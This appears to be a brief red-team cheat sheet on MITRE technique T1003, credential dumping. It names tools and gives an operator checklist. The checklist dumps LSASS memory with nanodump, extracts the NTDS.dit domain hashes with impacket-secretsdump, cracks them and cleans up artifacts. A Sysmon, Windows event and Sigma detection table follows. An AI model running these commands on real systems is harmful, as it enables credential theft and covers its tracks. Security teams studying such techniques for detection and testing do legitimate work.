# T1003 – OS Credential Dumping

## 🎯 Objective
Obtain credentials from operating system components (SAM, LSASS, NTDS.dat).

---

### 🧰 Tools
| OS | Tools |
|----|-------|
| Windows | Mimikatz, Procdump, lsassy, nanodump |
| Linux | mimipenguin, laZagne, hashdump via /ect/shadow |

---

### ✅ Operator Checklist
1. Enumerate context (`whoami /priv`, `systeminfo`).  
2. Dump LSASS securely:  
   `nanodump.exe --write C:\temp\lsass.dmp`  
3. Extract NTDS:  
   `impacket-secretsdump -ntds C:\Windows\NTDS\ntds.dit -system SYSTEM -local`  
4. Parse credentials (hashcat, john).  
5. Cleanup artifacts.

---

### ⚕ Detection
| Source | Indicator |
|---------|-----------|
| Sysmon | Event 10 (Process Access — lsass.exe) |
| Windows Security | 4688 with MiniDumpWriteDump API |
| Sigma | `lsass_access.yml` |


Author : yasinabedini
GitHub : https://github.com/yasinabedini

